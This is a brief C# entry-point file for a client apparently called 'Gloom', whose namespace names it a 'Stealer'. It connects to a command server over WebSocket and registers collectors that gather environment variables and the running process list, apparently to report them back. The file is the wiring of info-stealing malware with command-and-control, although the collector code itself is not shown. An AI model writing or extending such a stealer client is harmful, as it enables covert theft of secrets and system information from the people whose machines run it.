﻿using Gloom.Client.Features.Stealer.InfoCollector;

namespace Gloom.Client
{
	internal class Program
	{
		public const string CommandServer = "ws://127.0.0.1:8683";

		static void Main(string[] args)
		{
			var client = new MessageClient(new Uri(CommandServer));
			client.RegisterHandler(new EnvVarsCollector(client));
			client.RegisterHandler(new ProcessListCollector(client));
			client.Run().Wait();
		}
	}
}
